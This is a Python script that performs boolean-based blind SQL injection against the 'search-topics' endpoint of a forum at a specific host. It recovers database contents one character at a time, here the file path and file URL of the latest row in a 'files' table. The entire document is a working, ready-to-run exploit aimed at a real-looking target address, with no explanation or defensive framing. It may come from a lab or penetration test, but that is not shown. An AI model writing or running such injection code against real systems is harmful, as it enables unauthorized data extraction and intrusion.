import requests
import re
import base64

# Target URL
BASE_URL = "http://ccw84s4g4cgsk440c0ssookc.72.62.122.96.sslip.io"

session = requests.Session()

def test(payload):
    url = f"{BASE_URL}/forums/search-topics?search=') OR ({payload}) AND ('1'='1"
    r = session.get(url)
    return len(r.text) > 100000

def get_data(sql_query, length=50):
    print(f"[*] Extracting query result for: {sql_query}")
    data = ""
    for pos in range(1, length + 1):
        found = False
        # Try characters
        for char_code in range(32, 127):
            # Hex encode to be safe
            char = chr(char_code)
            payload = f"(SELECT ASCII(SUBSTR(({sql_query}),{pos},1)))={char_code}"
            if test(payload):
                data += char
                print(f"[+] Found char: {char}")
                found = True
                break
        if not found: break
    return data

# Extract interactive_file_path of the last file
path = get_data("SELECT interactive_file_path FROM files ORDER BY id DESC LIMIT 1", 100)
print(f"\n[!!!!] EXTRACTED PATH FROM DB: {path}")

# Check the file url too
file_url = get_data("SELECT file FROM files ORDER BY id DESC LIMIT 1", 100)
print(f"[!!!!] EXTRACTED FILE URL FROM DB: {file_url}")
